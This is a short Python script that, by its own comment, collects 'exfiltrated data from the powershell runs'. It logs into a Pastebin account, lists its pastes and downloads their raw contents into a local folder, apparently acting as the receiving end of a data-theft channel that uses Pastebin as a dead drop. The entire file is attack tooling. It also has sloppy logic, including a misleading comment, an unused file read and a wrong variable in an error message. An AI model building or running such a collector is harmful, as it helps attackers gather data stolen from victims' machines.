#!/usr/bin/env python
# Pull the exfiltrated data from the powershell runs
import xml.etree.ElementTree as ET
import getpass

import pastebin
import os
# API Settings
api_dev_key  = 'YOURDEVKEY'
api_user_key = None
api_password = 'YOURPASS'
api_username  = 'YOURUSERNAME'

# Define API
if api_user_key:
	api = pastebin.PasteBin(api_dev_key, api_user_key)
else:
	api = pastebin.PasteBin(api_dev_key)
	username = api_username 
	if api_password is None:
		password = getpass.getpass('[?] - Password: ')
	else:
		password = api_password
	api_user_key = api.create_user_key(username, password)
	if 'Bad API request' not in api_user_key:
		print('[+] - You API user key is: ' + api_user_key)
		api = pastebin.PasteBin(api_dev_key, api_user_key)
	else:
		raise SystemExit('[!] - Failed to create API user key! ({0})'.format(api_user_key.split(', ')[1]))

# Create a Paste
data   = open(__file__).read()
result = api.list_pastes()
if 'Bad API request' not in result:
    root = ET.fromstring(result)

    datadict= {}
    for child in root:
        datadict[child.tag] = child.text

    paste_url = datadict['paste_url']
    paste_title = datadict['paste_title']
    payload = api.raw_pastes(datadict['paste_key'])

    os.makedirs('data',exist_ok=True)
    with open('./data/{0}_{1}.txt'.format(datadict['paste_key'],datadict['paste_date']),'w') as file:
        file.write(payload)

else:
	raise SystemExit('[!] - Failed to create paste! ({0})'.format(api_user_key.split(', ')[1]))